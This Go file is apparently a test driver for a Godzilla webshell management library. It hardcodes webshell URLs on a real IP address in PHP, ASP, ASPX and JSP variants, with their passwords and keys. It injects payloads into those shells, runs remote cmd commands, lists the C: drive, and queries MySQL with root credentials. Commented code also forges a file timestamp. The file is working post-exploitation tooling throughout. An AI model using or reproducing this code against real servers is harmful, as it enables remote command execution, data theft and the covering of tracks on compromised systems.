package main

import (
	"fmt"
	"github.com/go0p/wsm"
	"github.com/go0p/wsm/lib/charset"
	"github.com/go0p/wsm/lib/shell"
	"github.com/go0p/wsm/lib/shell/godzilla"
	"github.com/go0p/wsm/lib/shell/godzilla/plugins"
	"log"
)

const (
	AspRawShellUrl   = "http://139.196.175.86:8081/xorraw.asp"
	AspBs64ShellUrl  = "http://139.196.175.86:8081/xorbs64.asp"
	AspxBs64ShellUrl = "http://139.196.175.86:8081/bs64.aspx"
	AspxRawShellUrl  = "http://139.196.175.86:8081/raw.aspx"
	JspBs64ShellUrl  = "http://139.196.175.86:8080/bs64.jsp"
	JspRawShellUrl   = "http://139.196.175.86:8080/raw.jsp"
	JspxBs64ShellUrl = "http://139.196.175.86:8080/bs64.jspx"
	JspxRawShellUrl  = "http://139.196.175.86:8080/raw.jspx"
	PhpBs64ShellUrl  = "http://139.196.175.86/bs64.php"
	PhpRawShellUrl   = "http://139.196.175.86/raw.php"
)

func main() {
	log.SetFlags(log.Lshortfile)
	//log.Println("Jsp")
	//testJspBs64()
	//testJspRaw()
	//
	//log.Println("Jspx")
	//testJspxBs64()
	//testJspxRaw()
	//
	//log.Println("Aspx")
	//testAspxBs64()
	//testAspxRaw()
	//
	//log.Println("Asp")
	//testAspBs64()
	//testAspRaw()
	//
	log.Println("Php")
	testPhpBs64()
	//testPhpRaw()
}

func testPhpBs64() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      PhpBs64ShellUrl,
			Password: "pass",
			Script:   shell.PhpScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.PHP_XOR_BASE64,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}
	if err != nil {
		log.Println(err)
	}

	isAlive, err := g.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(isAlive)

	db := &godzilla.DBManagerParams{
		DBType:     "mysql",
		DBHost:     "127.0.0.1",
		DBPort:     3306,
		DBUsername: "root",
		DBPassword: "root",
		ExecType:   "select",
		ExecSql:    "SHOW DATABASES",
		DBCharset:  charset.UTF8CharSet,
		CurrentDB:  "",
	}
	dbInfo, err := g.DatabaseManagement(db)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("DatabaseManagement : \n", dbInfo.ToMap())

	db.ExecSql = "SELECT * FROM `godzilla`.`test` LIMIT 0,10"

	dbInfo, err = g.DatabaseManagement(db)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("DatabaseManagement : \n", dbInfo.ToMap())
}

func testPhpRaw() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      PhpRawShellUrl,
			Password: "pass",
			Script:   shell.PhpScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.PHP_XOR_RAW,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	isAlive, err := g.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(isAlive)
}

func testAspxBs64() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspxBs64ShellUrl,
			Password: "pass",
			Script:   shell.CsharpScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.CSHARP_AES_BASE64,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	isAlive, err := g.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(isAlive)

	db := &godzilla.DBManagerParams{
		DBType:     "mysql",
		DBHost:     "127.0.0.1",
		DBPort:     3306,
		DBUsername: "root",
		DBPassword: "root",
		ExecType:   "select",
		ExecSql:    "SHOW DATABASES",
		DBCharset:  charset.UTF8CharSet,
		CurrentDB:  "",
	}
	dbInfo, err := g.DatabaseManagement(db)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("DatabaseManagement : \n", dbInfo.ToMap())
}

func testAspxRaw() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspxRawShellUrl,
			Password: "pass",
			Script:   shell.CsharpScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.CSHARP_AES_RAW,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	isAlive, err := g.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(isAlive)
}

func testAspBs64() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspBs64ShellUrl,
			Password: "pass",
			Script:   shell.AspScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.ASP_XOR_BASE64,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	isAlive, err := g.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(isAlive)
}

func testAspRaw() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspRawShellUrl,
			Password: "pass",
			Script:   shell.AspScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.ASP_XOR_RAW,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	isAlive, err := g.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(isAlive)
}

func testJspxBs64() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspxBs64ShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_BASE64,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	isAlive, err := g.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(isAlive)
}

func testJspxRaw() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspxRawShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_RAW,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	isAlive, err := g.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(isAlive)
}

func testJspBs64() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspBs64ShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_BASE64,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	isAlive, err := g.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(isAlive)

	basic, err := g.BasicInfo()
	if err != nil {
		log.Println(err)
	}
	fmt.Printf("%#+v\n", basic.ToMap())

	cp := &godzilla.ExecParams{
		//`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`
		RealCommand: `cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好 hhh"`,
		Template:    `cmd /c "{command}"`,
		Command:     `echo 你好`,
	}
	echo, err := g.CommandExec(cp)
	if err != nil {
		log.Println(err)
	}
	fmt.Printf("Echo : %#+v\n", echo.ToString())

	gf := &godzilla.GetFiles{DirName: "C:/"}
	getFile, err := g.FileManagement(gf)
	if err != nil {
		log.Println(err)
	}
	fmt.Println("getFiles : \n", getFile.ToMap())

	//sfa := &godzilla.FixFileAttr{
	//	FileName: "C:/shells/godzilla.txt",
	//	FileAttr: godzilla.FileTimeAttr,
	//	// 创建时间 2022-07-08 21:04:01
	//	Attr: "2012-07-08 21:04:01",
	//}
	//setFileAttr, err := g.FileManagement(sfa)
	//
	//if err != nil {
	//	log.Printf("%#+v\n", err)
	//}
	//fmt.Println("setFileAttr : \n", setFileAttr.ToMap())

	// 先加载数据库驱动
	usePlugins, err := g.UsePlugins(plugins.NewJarDriverLoader(plugins.MysqlDriver))
	if err != nil {
		log.Println(err)
	}
	fmt.Println(usePlugins.ToString())

	db := &godzilla.DBManagerParams{
		DBType:     "mysql",
		DBHost:     "127.0.0.1",
		DBPort:     3306,
		DBUsername: "root",
		DBPassword: "root",
		ExecType:   "select",
		ExecSql:    "SHOW DATABASES",
		DBCharset:  charset.UTF8CharSet,
		CurrentDB:  "",
	}
	dbInfo, err := g.DatabaseManagement(db)
	fmt.Println("DatabaseManagement : \n", dbInfo.ToMap())

	//basicInfo := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&print 1"`)
	//basicInfo := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&whoami /"`)
	//fmt.Println("Info : ", basicInfo)

	//	[[{"name":"Id"},{"name":"string"},{"name":"raw"}],["1","è¿æ¯ä¸æ¡æµè¯æ°æ®-----godzilla","1233454354354"],["2","tttttttttttt","behinder"]]
	//Id	string	raw
	//1	ÕâÊÇÒ»Ìõ²âÊÔÊý¾Ý-----godzilla	1233454354354
	//2	tttttttttttt	behinder
}

func testJspRaw() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspRawShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_RAW,
		Encoding: charset.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	err = g.InjectPayload()
	if err != nil {
		log.Println(err)
	}

	isAlive, err := g.Ping()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(isAlive)
	//basicInfo1, err := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`)
	cp := &godzilla.ExecParams{
		//`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`
		Template: `cmd /c "{command}"`,
		Command:  `echo 你好`,
	}
	echo, err := g.CommandExec(cp)
	if err != nil {
		log.Println(err)
	}
	fmt.Printf("Echo : %#+v\n", echo.ToString())

	//basicInfo := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&print 1"`)
	//basicInfo := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&whoami /"`)
	//fmt.Println("Info : ", basicInfo)
}
